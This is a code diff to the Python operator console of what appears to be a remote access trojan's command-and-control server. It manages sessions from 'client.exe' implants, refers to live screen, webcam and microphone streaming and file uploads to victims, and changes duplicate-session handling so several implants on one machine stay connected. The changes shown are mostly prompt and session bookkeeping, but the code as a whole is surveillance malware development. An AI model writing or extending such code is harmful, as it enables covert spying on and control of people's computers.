@@ -251,12 +251,20 @@ class WebSocketServer:
             os.system('clear')
     
     def server_prompt(self):
-        """Server prompt with red sub6"""
+        """Server prompt with red sub6 (for prompt_toolkit)"""
         return ANSI('\033[91msub6\033[0m > ')
     
     def session_prompt(self, sid):
-        """Session prompt with cyan session"""
+        """Session prompt with cyan session (for prompt_toolkit)"""
         return ANSI(f'\033[96msession {sid}\033[0m > ')
+    
+    def server_prompt_raw(self):
+        """Server prompt raw string (for print())"""
+        return '\033[91msub6\033[0m > '
+    
+    def session_prompt_raw(self, sid):
+        """Session prompt raw string (for print())"""
+        return f'\033[96msession {sid}\033[0m > '
     
     def print_session_help(self, session_id):
         """Print OS-specific help menu for session"""
@@ -394,20 +402,12 @@ class WebSocketServer:
         self.input_thread.start()
     
     def find_duplicate_session(self, computer, user, client_ip, client_id=None):
-        """Check if there's already an active session from the same client"""
-        for sid, session in list(self.sessions.items()):
-            # First priority: Check by ClientID (unique per client instance)
-            if client_id and session.get('client_id') == client_id and client_id != 'Unknown':
-                return sid
-            # Fallback: Check if same computer/user combo exists (only if no ClientID)
-            if not client_id and (session.get('computer') == computer and 
-                session.get('user') == user and 
-                computer != 'Unknown'):
-                return sid
-            # Also check same IP with recent connection (within 5 seconds)
-            if session.get('addr') and session['addr'][0] == client_ip:
-                time_diff = (datetime.now() - session.get('start_time', datetime.now())).total_seconds()
-                if time_diff < 5 and session.get('computer') == 'Unknown':
+        """Check if there's already an active session from the SAME client process (by ClientID only)"""
+        # Only match by ClientID - this allows multiple different clients on the same machine
+        # A ClientID includes the ProcessID, so a new client.exe will have a different ID
+        if client_id and client_id != 'Unknown':
+            for sid, session in list(self.sessions.items()):
+                if session.get('client_id') == client_id:
                     return sid
         return None
     
@@ -418,25 +418,11 @@ class WebSocketServer:
         
         client_ip = websocket.remote_address[0]
         
-        # Track if this might be a quick reconnect (don't show "opened" message yet)
+        # Track if this might be a quick reconnect (will be determined later by ClientID)
         is_quick_reconnect = False
         
-        # Check for very recent duplicate connection from same IP (race condition)
-        for sid, session in list(self.sessions.items()):
-            if session.get('addr') and session['addr'][0] == client_ip:
-                time_diff = (datetime.now() - session.get('start_time', datetime.now())).total_seconds()
-                if time_diff < 5:  # Within 5 seconds = likely reconnect
-                    is_quick_reconnect = True
-                    # Close the older one silently
-                    try:
-                        await session['websocket'].close()
-                    except:
-                        pass
-                    if sid in self.sessions:
-                        del self.sessions[sid]
-                    if self.active_session == sid:
-                        self.active_session = None
-                    # Don't print message here - will show combined message when client info received
+        # Don't close any sessions here based on IP - wait for ClientID to determine duplicates
+        # This allows multiple different clients from the same machine to connect
         
         self.sessions[session_id] = {
             'websocket': websocket,
@@ -863,9 +849,9 @@ class WebSocketServer:
         print(f"{YELLOW}[*]{RESET} Use '{CYAN}stoplive{RESET}' in session to stop streaming")
         
         if self.active_session:
-            print(self.session_prompt(self.active_session), end="", flush=True)
+            print(self.session_prompt_raw(self.active_session), end="", flush=True)
         else:
-            print(self.server_prompt(), end="", flush=True)
+            print(self.server_prompt_raw(), end="", flush=True)
     
     def get_local_ip(self):
         """Get local IP address"""
@@ -1291,9 +1277,9 @@ class WebSocketServer:
         print(f"{YELLOW}[*]{RESET} Use '{CYAN}stopcam{RESET}' in session to stop streaming")
         
         if self.active_session:
-            print(self.session_prompt(self.active_session), end="", flush=True)
+            print(self.session_prompt_raw(self.active_session), end="", flush=True)
         else:
-            print(self.server_prompt(), end="", flush=True)
+            print(self.server_prompt_raw(), end="", flush=True)
     
     def run_camview_webserver(self, session_id):
         """Run HTTP server for camera view"""
@@ -1532,9 +1518,9 @@ class WebSocketServer:
         print(f"{YELLOW}[*]{RESET} Use '{CYAN}stopaudio{RESET}' in session to stop streaming")
         
         if self.active_session:
-            print(self.session_prompt(self.active_session), end="", flush=True)
+            print(self.session_prompt_raw(self.active_session), end="", flush=True)
         else:
-            print(self.server_prompt(), end="", flush=True)
+            print(self.server_prompt_raw(), end="", flush=True)
     
     def run_liveaudio_webserver(self, session_id):
         """Run HTTP server for live audio"""
@@ -1812,7 +1798,7 @@ class WebSocketServer:
             except Exception as e:
                 if self.active_session == session_id:
                     print(f"\n[!] Base64 decode error: {e}")
-                    print(self.session_prompt(session_id), end="", flush=True)
+                    print(self.session_prompt_raw(session_id), end="", flush=True)
                 return
             
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -1965,11 +1951,11 @@ class WebSocketServer:
             await websocket.send(upload_msg.encode('utf-8'))
             
             print(f"[+] File uploaded: {filename} ({file_size} bytes)")
-            print(self.session_prompt(session_id), end="", flush=True)
+            print(self.session_prompt_raw(session_id), end="", flush=True)
             
         except Exception as e:
             print(f"[!] Upload error: {e}")
-            print(self.session_prompt(session_id), end="", flush=True)
+            print(self.session_prompt_raw(session_id), end="", flush=True)
     
     async def interact(self, session_id):
         """Interactive session with proper notification handling"""
